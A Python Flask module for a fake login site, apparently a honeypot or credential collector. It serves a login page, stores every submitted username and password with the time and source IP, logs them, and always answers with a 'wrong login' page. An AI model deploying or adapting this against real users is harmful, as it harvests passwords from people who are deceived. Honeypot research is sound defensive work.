# -*- encoding: utf-8 -*-
"""
This is the module that contains the main logic.
It defines a class called `Collector` that customizes some
bits of a Flask app (initializing the database, for example),
and a `create_app` function that adds the routes to the app,
managing them with the appropriate behaviour.
Here is also defined a `print_page` function
"""
import datetime
import pkg_resources

from flask import Flask, request
from tinydb import TinyDB

from .FLexceptions import PostError, UnknownError, ConfigError, DBInsertError


def print_page(page_path):
    try:
        page = pkg_resources.resource_string(__name__, page_path)
        return page
    except:
        raise IOError


class Collector(Flask):
    def __init__(self, import_name, conf):
        super(Collector, self).__init__(import_name)
        self.db_path = conf['db_path']
        self.db = None
        self.logger.setLevel(conf['log_level'])

    def init_db(self):
        try:
            self.db = TinyDB(self.db_path)
            self.logger.info("db init'd")
        except IOError:
            self.logger.error("db init failed")
            raise ConfigError
        except:
            raise UnknownError

    def add_to_db(self, data):
        try:
            db = self.db
            entry = {
                "time": data['time'],
                "src_ip": data['ip'],
                "user": data['user'],
                "password": data['password']
            }
            self.logger.debug("Just entered: {}".format(entry))
            db.insert(entry)
        except:
            raise DBInsertError


def create_app(import_name="default_app", conf={}):
    app = Collector(import_name, conf=conf)
    app.init_db()

    @app.route("/")
    def login_serve():
        try:
            return print_page("webassets/index.html")
        except IOError:
            app.logger.error("webassets/index.html not readable")
            raise ConfigError
        except:
            raise UnknownError

    @app.route("/js/<jspath>")
    def js_serve(jspath):
        try:
            return print_page("webassets/js/{}".format(jspath))
        except IOError:
            app.logger.error(" js/{} not readable".format(jspath))
            raise ConfigError
        except:
            raise UnknownError

    @app.route("/login", methods=['POST'])
    def collect():
        try:
            user = request.form.getlist('u')
            password = request.form.getlist('p')
            now = format(datetime.datetime.now())
            ip = request.remote_addr
            data = {
                "user": user,
                "password": password,
                "time": now,
                "ip": ip
            }
            app.add_to_db(data)
            return print_page("webassets/wrong_login.html")
        except IOError:
            app.logger.error("webassets/wrong_login.html not readable")
            raise ConfigError
        except:
            raise PostError

    return app
